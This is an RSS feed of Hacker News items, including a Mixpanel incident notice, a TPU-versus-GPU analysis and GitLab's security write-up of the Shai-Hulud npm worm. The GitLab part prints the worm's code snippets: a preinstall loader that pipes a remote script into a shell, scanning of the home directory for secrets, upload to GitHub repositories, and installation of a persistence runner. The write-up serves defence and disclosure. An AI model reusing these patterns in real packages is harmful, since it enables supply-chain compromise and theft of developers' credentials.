<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 28 Nov 2025 05:40:47 +0000</lastBuildDate><item><title>Coq: The World's Best Macro Assembler? (2013) [pdf]</title><link>https://nickbenton.name/coqasm.pdf</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46065698</guid><pubDate>Thu, 27 Nov 2025 04:34:56 +0000</pubDate></item><item><title>Tell HN: Happy Thanksgiving</title><link>https://news.ycombinator.com/item?id=46065955</link><description>&lt;doc fingerprint="7f4ed38a148e83a2"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;I‚Äôve been a part of this community for fifteen years. Despite the yearly bemoaning of HN‚Äôs quality compared to its mythical past, I‚Äôve found that it‚Äôs the one community that has remained steadfast as a source of knowledge, cattiness, and good discussion.&lt;/p&gt;
      &lt;p&gt;Thank you @dang and @tomhow.&lt;/p&gt;
      &lt;p&gt;Here's to another year.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46065955</guid><pubDate>Thu, 27 Nov 2025 05:21:16 +0000</pubDate></item><item><title>Linux Kernel Explorer</title><link>https://reverser.dev/linux-kernel-explorer</link><description>&lt;doc fingerprint="7391f92da42b0365"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;The kernel isn't a process‚Äîit's the system. It serves user processes, reacts to context, and enforces separation and control.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;The Kernel Is Not a Process: It's the always-present authority bridging hardware and software.&lt;/item&gt;
          &lt;item&gt;Serving the Process: Orchestrates syscalls, interrupts, and scheduling to keep user tasks running.&lt;/item&gt;
          &lt;item&gt;System of Layers: Virtual, mapped, isolated, and controlled‚Äîstructure at runtime.&lt;/item&gt;
        &lt;/list&gt;
        &lt;div&gt;
          &lt;head rend="h4"&gt;üìö Study Files&lt;/head&gt;
          &lt;div&gt;
            &lt;p&gt;init/main.c&lt;/p&gt;
            &lt;p&gt;kernel/fork.c&lt;/p&gt;
            &lt;p&gt;include/linux/sched.h&lt;/p&gt;
            &lt;p&gt;arch/x86/kernel/entry_64.S&lt;/p&gt;
          &lt;/div&gt;
        &lt;/div&gt;
        &lt;div&gt;
          &lt;div&gt;
            &lt;div&gt;
              &lt;p&gt;1. What is the fundamental difference between the kernel and a process?&lt;/p&gt;
              &lt;div&gt;
                &lt;p&gt;A.The kernel is a special process with elevated privileges&lt;/p&gt;
                &lt;p&gt;B.The kernel is not a process‚Äîit's the system itself that serves processes&lt;/p&gt;
                &lt;p&gt;C.The kernel is just a library that processes link against&lt;/p&gt;
                &lt;p&gt;D.There is no difference; they are the same thing&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
            &lt;div&gt;
              &lt;p&gt;2. How does the kernel primarily serve user processes?&lt;/p&gt;
              &lt;div&gt;
                &lt;p&gt;A.By running as a background daemon&lt;/p&gt;
                &lt;p&gt;B.By orchestrating syscalls, interrupts, and scheduling&lt;/p&gt;
                &lt;p&gt;C.By providing a GUI interface&lt;/p&gt;
                &lt;p&gt;D.By compiling user code&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
            &lt;div&gt;
              &lt;p&gt;3. What characterizes the kernel's system of layers?&lt;/p&gt;
              &lt;div&gt;
                &lt;p&gt;A.Physical, tangible, and direct&lt;/p&gt;
                &lt;p&gt;B.Simple and flat with no hierarchy&lt;/p&gt;
                &lt;p&gt;C.Virtual, mapped, isolated, and controlled&lt;/p&gt;
                &lt;p&gt;D.User-accessible and modifiable&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46066280</guid><pubDate>Thu, 27 Nov 2025 06:17:37 +0000</pubDate></item><item><title>Mixpanel Security Breach</title><link>https://mixpanel.com/blog/sms-security-incident/</link><description>&lt;doc fingerprint="35be0cd749786243"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Our response to a recent security incident&lt;/head&gt;
    &lt;p&gt;Out of transparency and our desire to share with our community, this blog post contains key information about a recent security incident that impacted a limited number of our customers. On November 8th, 2025, Mixpanel detected a smishing campaign and promptly executed our incident response processes. We took comprehensive steps to contain and eradicate unauthorized access and secure impacted user accounts. We engaged external cybersecurity partners to remediate and respond to the incident.&lt;/p&gt;
    &lt;p&gt;We proactively communicated with all impacted customers. If you have not heard from us directly, you were not impacted. We continue to prioritize security as a core tenet of our company, products and services. We are committed to supporting our customers and communicating transparently about this incident.&lt;/p&gt;
    &lt;head rend="h2"&gt;What we did in response&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Secured affected accounts&lt;/item&gt;
      &lt;item&gt;Revoked all active sessions and sign-ins&lt;/item&gt;
      &lt;item&gt;Rotated compromised Mixpanel credentials for impacted accounts&lt;/item&gt;
      &lt;item&gt;Blocked malicious IP addresses&lt;/item&gt;
      &lt;item&gt;Registered IOCs in our SIEM platform&lt;/item&gt;
      &lt;item&gt;Performed global password resets for all Mixpanel employees&lt;/item&gt;
      &lt;item&gt;Engaged third-party forensics firm to advise on containment and eradication measures&lt;/item&gt;
      &lt;item&gt;Performed a forensic review of authentication, session, and export logs across impacted accounts&lt;/item&gt;
      &lt;item&gt;Implemented additional controls to detect and block similar activity going forward.&lt;/item&gt;
      &lt;item&gt;Engaged with law enforcement and external cybersecurity advisors&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;What you should know&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;If you received a communication from us, please review it for the steps we have taken to secure your account, as well as next steps.&lt;/item&gt;
      &lt;item&gt;If you did not receive a communication from us, no action is required. Your accounts were not impacted.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you have any questions about this incident, please contact support@mixpanel.com.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46066522</guid><pubDate>Thu, 27 Nov 2025 07:02:40 +0000</pubDate></item><item><title>TPUs vs. GPUs and why Google is positioned to win AI race in the long term</title><link>https://www.uncoveralpha.com/p/the-chip-made-for-the-ai-inference</link><description>&lt;doc fingerprint="3d3a95c811b6b1f1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The chip made for the AI inference era ‚Äì the Google TPU&lt;/head&gt;
    &lt;p&gt;Hey everyone,&lt;/p&gt;
    &lt;p&gt;As I find the topic of Google TPUs extremely important, I am publishing a comprehensive deep dive, not just a technical overview, but also strategic and financial coverage of the Google TPU.&lt;/p&gt;
    &lt;p&gt;Topics covered:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Google‚Äôs TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Gemini 3 and the aftermath of Gemini 3 on the whole chip industry&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Let‚Äôs dive into it.&lt;/p&gt;
    &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
    &lt;p&gt;The story of the Google Tensor Processing Unit (TPU) begins not with a breakthrough in chip manufacturing, but with a realization about math and logistics. Around 2013, Google‚Äôs leadership‚Äîspecifically Jeff Dean, Jonathan Ross (the CEO of Groq), and the Google Brain team‚Äîran a projection that alarmed them. They calculated that if every Android user utilized Google‚Äôs new voice search feature for just three minutes a day, the company would need to double its global data center capacity just to handle the compute load.&lt;/p&gt;
    &lt;p&gt;At the time, Google was relying on standard CPUs and GPUs for these tasks. While powerful, these general-purpose chips were inefficient for the specific heavy lifting required by Deep Learning: massive matrix multiplications. Scaling up with existing hardware would have been a financial and logistical nightmare.&lt;/p&gt;
    &lt;p&gt;This sparked a new project. Google decided to do something rare for a software company: build its own custom silicon. The goal was to create an ASIC (Application-Specific Integrated Circuit) designed for one job only: running TensorFlow neural networks.&lt;/p&gt;
    &lt;p&gt;Key Historical Milestones:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;2013-2014: The project moved really fast as Google both hired a very capable team and, to be honest, had some luck in their first steps. The team went from design concept to deploying silicon in data centers in just 15 months‚Äîa very short cycle for hardware engineering.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2015: Before the world knew they existed, TPUs were already powering Google‚Äôs most popular products. They were silently accelerating Google Maps navigation, Google Photos, and Google Translate.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2016: Google officially unveiled the TPU at Google I/O 2016.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This urgency to solve the ‚Äúdata center doubling‚Äù problem is why the TPU exists. It wasn‚Äôt built to sell to gamers or render video; it was built to save Google from its own AI success. With that in mind, Google has been thinking about the ¬ªcostly¬´ AI inference problems for over a decade now. This is also one of the main reasons why the TPU is so good today compared to other ASIC projects.&lt;/p&gt;
    &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
    &lt;p&gt;To understand the difference, it helps to look at what each chip was originally built to do. A GPU is a ‚Äúgeneral-purpose‚Äù parallel processor, while a TPU is a ‚Äúdomain-specific‚Äù architecture.&lt;/p&gt;
    &lt;p&gt;The GPUs were designed for graphics. They excel at parallel processing (doing many things at once), which is great for AI. However, because they are designed to handle everything from video game textures to scientific simulations, they carry ‚Äúarchitectural baggage.‚Äù They spend significant energy and chip area on complex tasks like caching, branch prediction, and managing independent threads.&lt;/p&gt;
    &lt;p&gt;A TPU, on the other hand, strips away all that baggage. It has no hardware for rasterization or texture mapping. Instead, it uses a unique architecture called a Systolic Array.&lt;/p&gt;
    &lt;p&gt;The ‚ÄúSystolic Array‚Äù is the key differentiator. In a standard CPU or GPU, the chip moves data back and forth between the memory and the computing units for every calculation. This constant shuffling creates a bottleneck (the Von Neumann bottleneck).&lt;/p&gt;
    &lt;p&gt;In a TPU‚Äôs systolic array, data flows through the chip like blood through a heart (hence ‚Äúsystolic‚Äù).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;It loads data (weights) once.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It passes inputs through a massive grid of multipliers.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The data is passed directly to the next unit in the array without writing back to memory.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What this means, in essence, is that a TPU, because of its systolic array, drastically reduces the number of memory reads and writes required from HBM. As a result, the TPU can spend its cycles computing rather than waiting for data.&lt;/p&gt;
    &lt;p&gt;Google‚Äôs new TPU design, also called Ironwood also addressed some of the key areas where a TPU was lacking:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;They enhanced the SparseCore for efficiently handling large embeddings (good for recommendation systems and LLMs)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It increased HBM capacity and bandwidth (up to 192 GB per chip). For a better understanding, Nvidia‚Äôs Blackwell B200 has 192GB per chip, while Blackwell Ultra, also known as the B300, has 288 GB per chip.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Improved the Inter-Chip Interconnect (ICI) for linking thousands of chips into massive clusters, also called TPU Pods (needed for AI training as well as some time test compute inference workloads). When it comes to ICI, it is important to note that it is very performant with a Peak Bandwidth of 1.2 TB/s vs Blackwell NVLink 5 at 1.8 TB/s. But Google‚Äôs ICI, together with its specialized compiler and software stack, still delivers superior performance on some specific AI tasks.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The key thing to understand is that because the TPU doesn‚Äôt need to decode complex instructions or constantly access memory, it can deliver significantly higher Operations Per Joule.&lt;/p&gt;
    &lt;p&gt;For scale-out, Google uses Optical Circuit Switch (OCS) and its 3D torus network, which compete with Nvidia‚Äôs InfiniBand and Spectrum-X Ethernet. The main difference is that OCS is extremely cost-effective and power-efficient as it eliminates electrical switches and O-E-O conversions, but because of this, it is not as flexible as the other two. So again, the Google stack is extremely specialized for the task at hand and doesn‚Äôt offer the flexibility that GPUs do.&lt;/p&gt;
    &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
    &lt;p&gt;As we defined the differences, let‚Äôs look at real numbers showing how the TPU performs compared to the GPU. Since Google isn‚Äôt revealing these numbers, it is really hard to get details on performance. I studied many articles and alternative data sources, including interviews with industry insiders, and here are some of the key takeaways.&lt;/p&gt;
    &lt;p&gt;The first important thing is that there is very limited information on Google‚Äôs newest TPUv7 (Ironwood), as Google introduced it in April 2025 and is just now starting to become available to external clients (internally, it is said that Google has already been using Ironwood since April, possibly even for Gemini 3.0.). And why is this important if we, for example, compare TPUv7 with an older but still widely used version of TPUv5p based on Semianalysis data:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 produces 4,614 TFLOPS(BF16) vs 459 TFLOPS for TPUv5p&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 has 192GB of memory capacity vs TPUv5p 96GB&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 memory Bandwidth is 7,370 GB/s vs 2,765 for v5p&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We can see that the performance leaps between v5 and v7 are very significant. To put that in context, most of the comments that we will look at are more focused on TPUv6 or TPUv5 than v7.&lt;/p&gt;
    &lt;p&gt;Based on analyzing a ton of interviews with Former Google employees, customers, and competitors (people from AMD, NVDA &amp;amp; others), the summary of the results is as follows.&lt;/p&gt;
    &lt;p&gt;Most agree that TPUs are more cost-effective compared to Nvidia GPUs, and most agree that the performance per watt for TPUs is better. This view is not applicable across all use cases tho.&lt;/p&gt;
    &lt;p&gt;A Former Google Cloud employee:&lt;/p&gt;
    &lt;p&gt;¬ªIf it is the right application, then they can deliver much better performance per dollar compared to GPUs. They also require much lesser energy and produces less heat compared to GPUs. They‚Äôre also more energy efficient and have a smaller environmental footprint, which is what makes them a desired outcome.&lt;/p&gt;
    &lt;p&gt;The use cases are slightly limited to a GPU, they‚Äôre not as generic, but for a specific application, they can offer as much as 1.4X better performance per dollar, which is pretty significant saving for a customer that might be trying to use GPU versus TPUs.¬´&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Similarly, a very insightful comment from a Former Unit Head at Google around TPUs materially lowering AI-search cost per query vs GPUs:&lt;/p&gt;
    &lt;p&gt;¬ªTPU v6 is 60-65% more efficient than GPUs, prior generations 40-45%¬´&lt;/p&gt;
    &lt;p&gt;This interview was in November 2024, so the expert is probably comparing the v6 TPU with the Nvidia Hopper. Today, we already have Blackwell vs V7.&lt;/p&gt;
    &lt;p&gt;Many experts also mention the speed benefit that TPUs offer, with a Former Google Head saying that TPUs are 5x faster than GPUs for training dynamic models (like search-like workloads).&lt;/p&gt;
    &lt;p&gt;There was also a very eye-opening interview with a client who used both Nvidia GPUs and Google TPUs as he describes the economics in great detail:&lt;/p&gt;
    &lt;p&gt;¬ªIf I were to use eight H100s versus using one v5e pod, I would spend a lot less money on one v5e pod. In terms of price point money, performance per dollar, you will get more bang for TPU. If I already have a code, because of Google‚Äôs help or because of our own work, if I know it already is going to work on a TPU, then at that point it is beneficial for me to just stick with the TPU usage.&lt;/p&gt;
    &lt;p&gt;In the long run, if I am thinking I need to write a new code base, I need to do a lot more work, then it depends on how long I‚Äôm going to train. I would say there is still some, for example, of the workload we have already done on TPUs that in the future because as Google will add newer generation of TPU, they make older ones much cheaper.&lt;lb/&gt;For example, when they came out with v4, I remember the price of v2 came down so low that it was practically free to use compared to any NVIDIA GPUs.&lt;/p&gt;
    &lt;p&gt;Google has got a good promise so they keep supporting older TPUs and they‚Äôre making it a lot cheaper. If you don‚Äôt really need your model trained right away, if you‚Äôre willing to say, ‚ÄúI can wait one week,‚Äù even though the training is only three days, then you can reduce your cost 1/5.¬´&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Another valuable interview was with a current AMD employee, acknowledging the benefits of ASICs:&lt;/p&gt;
    &lt;p&gt;¬ªI would expect that an AI accelerator could do about probably typically what we see in the industry. I‚Äôm using my experience at FPGAs. I could see a 30% reduction in size and maybe a 50% reduction in power vs a GPU.¬´&lt;/p&gt;
    &lt;p&gt;We also got some numbers from a Former Google employee who worked in the chip segment:&lt;/p&gt;
    &lt;p&gt;¬ªWhen I look at the published numbers, they (TPUs) are anywhere from 25%-30% better to close to 2x better, depending on the use cases compared to Nvidia. Essentially, there‚Äôs a difference between a very custom design built to do one task perfectly versus a more general purpose design.¬´&lt;/p&gt;
    &lt;p&gt;What is also known is that the real edge of TPUs lies not in the hardware but in the software and in the way Google has optimized its ecosystem for the TPU.&lt;/p&gt;
    &lt;p&gt;A lot of people mention the problem that every Nvidia ¬ªcompetitor¬´ like the TPU faces, which is the fast development of Nvidia and the constant ¬ªcatching up¬´ to Nvidia problem. This month a former Google Cloud employee addressed that concern head-on as he believes the rate at which TPUs are improving is faster than the rate at Nvidia:&lt;/p&gt;
    &lt;p&gt;¬ªThe amount of performance per dollar that a TPU can generate from a new generation versus the old generation is a much significant jump than Nvidia¬´&lt;/p&gt;
    &lt;p&gt;In addition, the recent data from Google‚Äôs presentation at the Hot Chips 2025 event backs that up, as Google stated that the TPUv7 is 100% better in performance per watt than their TPUv6e (Trillium).&lt;/p&gt;
    &lt;p&gt;Even for hard Nvidia advocates, TPUs are not to be shrugged off easily, as even Jensen thinks very highly of Google‚Äôs TPUs. In a podcast with Brad Gerstner, he mentioned that when it comes to ASICs, Google with TPUs is a ¬ªspecial case¬´. A few months ago, we also got an article from the WSJ saying that after the news publication The Information published a report that stated that OpenAI had begun renting Google TPUs for ChatGPT, Jensen called Altman, asking him if it was true, and signaled that he was open to getting the talks back on track (investment talks). Also worth noting was that Nvidia‚Äôs official X account posted a screenshot of an article in which OpenAI denied plans to use Google‚Äôs in-house chips. To say the least, Nvidia is watching TPUs very closely.&lt;/p&gt;
    &lt;p&gt;Ok, but after looking at some of these numbers, one might think, why aren‚Äôt more clients using TPUs?&lt;/p&gt;
    &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
    &lt;p&gt;The main problem for TPUs adoption is the ecosystem. Nvidia‚Äôs CUDA is engraved in the minds of most AI engineers, as they have been learning CUDA in universities. Google has developed its ecosystem internally but not externally, as it has used TPUs only for its internal workloads until now. TPUs use a combination of JAX and TensorFlow, while the industry skews to CUDA and PyTorch (although TPUs also support PyTorch now). While Google is working hard to make its ecosystem more supportive and convertible with other stacks, it is also a matter of libraries and ecosystem formation that takes years to develop.&lt;/p&gt;
    &lt;p&gt;It is also important to note that, until recently, the GenAI industry‚Äôs focus has largely been on training workloads. In training workloads, CUDA is very important, but when it comes to inference, even reasoning inference, CUDA is not that important, so the chances of expanding the TPU footprint in inference are much higher than those in training (although TPUs do really well in training as well ‚Äì Gemini 3 the prime example).&lt;/p&gt;
    &lt;p&gt;The fact that most clients are multi-cloud also poses a challenge for TPU adoption, as AI workloads are closely tied to data and its location (cloud data transfer is costly). Nvidia is accessible via all three hyperscalers, while TPUs are available only at GCP so far. A client who uses TPUs and Nvidia GPUs explains it well:&lt;/p&gt;
    &lt;p&gt;¬ªRight now, the one biggest advantage of NVIDIA, and this has been true for past three companies I worked on is because AWS, Google Cloud and Microsoft Azure, these are the three major cloud companies.&lt;/p&gt;
    &lt;p&gt;Every company, every corporate, every customer we have will have data in one of these three. All these three clouds have NVIDIA GPUs. Sometimes the data is so big and in a different cloud that it is a lot cheaper to run our workload in whatever cloud the customer has data in.&lt;/p&gt;
    &lt;p&gt;I don‚Äôt know if you know about the egress cost that is moving data out of one cloud is one of the bigger cost. In that case, if you have NVIDIA workload, if you have a CUDA workload, we can just go to Microsoft Azure, get a VM that has NVIDIA GPU, same GPU in fact, no code change is required and just run it there.&lt;/p&gt;
    &lt;p&gt;With TPUs, once you are all relied on TPU and Google says, ‚ÄúYou know what? Now you have to pay 10X more,‚Äù then we would be screwed, because then we‚Äôll have to go back and rewrite everything. That‚Äôs why. That‚Äôs the only reason people are afraid of committing too much on TPUs. The same reason is for Amazon‚Äôs Trainium and Inferentia.¬´&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;These problems are well known at Google, so it is no surprise that internally, the debate over keeping TPUs inside Google or starting to sell them externally is a constant topic. When keeping them internally, it enhances the GCP moat, but at the same time, many former Google employees believe that at some point, Google will start offering TPUs externally as well, maybe through some neoclouds, not necessarily with the biggest two competitors, Microsoft and Amazon. Opening up the ecosystem, providing support, etc., and making it more widely usable are the first steps toward making that possible.&lt;/p&gt;
    &lt;p&gt;A former Google employee also mentioned that Google last year formed a more sales-oriented team to push and sell TPUs, so it‚Äôs not like they have been pushing hard to sell TPUs for years; it is a fairly new dynamic in the organization.&lt;/p&gt;
    &lt;p&gt;Google‚Äôs TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
    &lt;p&gt;The most valuable thing for me about TPUs is their impact on GCP. As we witness the transformation of cloud businesses from the pre-AI era to the AI era, the biggest takeaway is that the industry has gone from an oligopoly of AWS, Azure, and GCP to a more commoditized landscape, with Oracle, Coreweave, and many other neoclouds competing for AI workloads. The problem with AI workloads is the competition and Nvidia‚Äôs 75% gross margin, which also results in low margins for AI workloads. The cloud industry is moving from a 50-70% gross margin industry to a 20-35% gross margin industry. For cloud investors, this should be concerning, as the future profile of some of these companies is more like that of a utility than an attractive, high-margin business. But there is a solution to avoiding that future and returning to a normal margin: the ASIC.&lt;/p&gt;
    &lt;p&gt;The cloud providers who can control the hardware and are not beholden to Nvidia and its 75% gross margin will be able to return to the world of 50% gross margins. And there is no surprise that all three AWS, Azure, and GCP are developing their own ASICs. The most mature by far is Google‚Äôs TPU, followed by Amazon‚Äôs Trainum, and lastly Microsoft‚Äôs MAIA (although Microsoft owns the full IP of OpenAI‚Äôs custom ASICs, which could help them in the future).&lt;/p&gt;
    &lt;p&gt;While even with ASICs you are not 100% independent, as you still have to work with someone like Broadcom or Marvell, whose margins are lower than Nvidia‚Äôs but still not negligible, Google is again in a very good position. Over the years of developing TPUs, Google has managed to control much of the chip design process in-house. According to a current AMD employee, Broadcom no longer knows everything about the chip. At this point, Google is the front-end designer (the actual RTL of the design) while Broadcom is only the backend physical design partner. Google, on top of that, also, of course, owns the entire software optimization stack for the chip, which makes it as performant as it is. According to the AMD employee, based on this work split, he thinks Broadcom is lucky if it gets a 50-point gross margin on its part.&lt;/p&gt;
    &lt;p&gt;Without having to pay Nvidia for the accelerator, a cloud provider can either price its compute similarly to others and maintain a better margin profile or lower costs and gain market share. Of course, all of this depends on having a very capable ASIC that can compete with Nvidia. Unfortunately, it looks like Google is the only one that has achieved that, as the number one-performing model is Gemini 3 trained on TPUs. According to some former Google employees, internally, Google is also using TPUs for inference across its entire AI stack, including Gemini and models like Veo. Google buys Nvidia GPUs for GCP, as clients want them because they are familiar with them and the ecosystem, but internally, Google is full-on with TPUs.&lt;/p&gt;
    &lt;p&gt;As the complexity of each generation of ASICs increases, similar to the complexity and pace of Nvidia, I predict that not all ASIC programs will make it. I believe outside of TPUs, the only real hyperscaler shot right now is AWS Trainium, but even that faces much bigger uncertainties than the TPU. With that in mind, Google and its cloud business can come out of this AI era as a major beneficiary and market-share gainer.&lt;/p&gt;
    &lt;p&gt;Recently, we even got comments from the SemiAnalysis team praising the TPU:&lt;/p&gt;
    &lt;p&gt;¬ªGoogle‚Äôs silicon supremacy among hyperscalers is unmatched, with their TPU 7th Gen arguably on par with Nvidia Blackwell. TPU powers the Gemini family of models which are improving in capability and sit close to the pareto frontier of $ per intelligence in some tasks¬´&lt;/p&gt;
    &lt;p&gt;source: SemiAnalysis&lt;/p&gt;
    &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
    &lt;p&gt;Here are the numbers that I researched:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46069048</guid><pubDate>Thu, 27 Nov 2025 13:28:34 +0000</pubDate></item><item><title>GitLab discovers widespread NPM supply chain attack</title><link>https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/</link><description>&lt;doc fingerprint="850426190c2b864a"&gt;
  &lt;main&gt;&lt;p&gt;Published on: November 24, 2025&lt;/p&gt;&lt;p&gt;9 min read&lt;/p&gt;&lt;p&gt;Malware driving attack includes "dead man's switch" that can harm user data.&lt;/p&gt;&lt;p&gt;GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the "Shai-Hulud" malware.&lt;/p&gt;&lt;p&gt;Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a "dead man's switch" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.&lt;/p&gt;&lt;p&gt;We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.&lt;/p&gt;&lt;p&gt;Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:&lt;/p&gt;&lt;p&gt;While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.&lt;/p&gt;&lt;p&gt;The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified &lt;code&gt;package.json&lt;/code&gt; with a preinstall script pointing to &lt;code&gt;setup_bun.js&lt;/code&gt;. This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.&lt;/p&gt;&lt;code&gt;// This file gets added to victim's packages as setup_bun.js
#!/usr/bin/env node
async function downloadAndSetupBun() {
  // Downloads and installs bun
  let command = process.platform === 'win32' 
    ? 'powershell -c "irm bun.sh/install.ps1|iex"'
    : 'curl -fsSL https://bun.sh/install | bash';
  
  execSync(command, { stdio: 'ignore' });
  
  // Runs the actual malware
  runExecutable(bunPath, ['bun_environment.js']);
}
&lt;/code&gt;&lt;p&gt;The &lt;code&gt;setup_bun.js&lt;/code&gt; loader downloads or locates the Bun runtime on the system, then executes the bundled &lt;code&gt;bun_environment.js&lt;/code&gt; payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.&lt;/p&gt;&lt;p&gt;Once executed, the malware immediately begins credential discovery across multiple sources:&lt;/p&gt;&lt;code&gt;ghp_&lt;/code&gt; (GitHub personal access token) or &lt;code&gt;gho_&lt;/code&gt;(GitHub OAuth token)&lt;code&gt;.npmrc&lt;/code&gt; files and environment variables, which are common locations for securely storing sensitive configuration and credentials.&lt;code&gt;async function scanFilesystem() {
  let scanner = new Trufflehog();
  await scanner.initialize();
  
  // Scan user's home directory for secrets
  let findings = await scanner.scanFilesystem(os.homedir());
  
  // Upload findings to exfiltration repo
  await github.saveContents("truffleSecrets.json", 
    JSON.stringify(findings));
}
&lt;/code&gt;
&lt;p&gt;The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: "Sha1-Hulud: The Second Coming." These repositories serve as dropboxes for stolen credentials and system information.&lt;/p&gt;&lt;code&gt;async function createRepo(name) {
  // Creates a repository with a specific description marker
  let repo = await this.octokit.repos.createForAuthenticatedUser({
    name: name,
    description: "Sha1-Hulud: The Second Coming.", // Marker for finding repos later
    private: false,
    auto_init: false,
    has_discussions: true
  });
  
  // Install GitHub Actions runner for persistence
  if (await this.checkWorkflowScope()) {
    let token = await this.octokit.request(
      "POST /repos/{owner}/{repo}/actions/runners/registration-token"
    );
    await installRunner(token); // Installs self-hosted runner
  }
  
  return repo;
}
&lt;/code&gt;
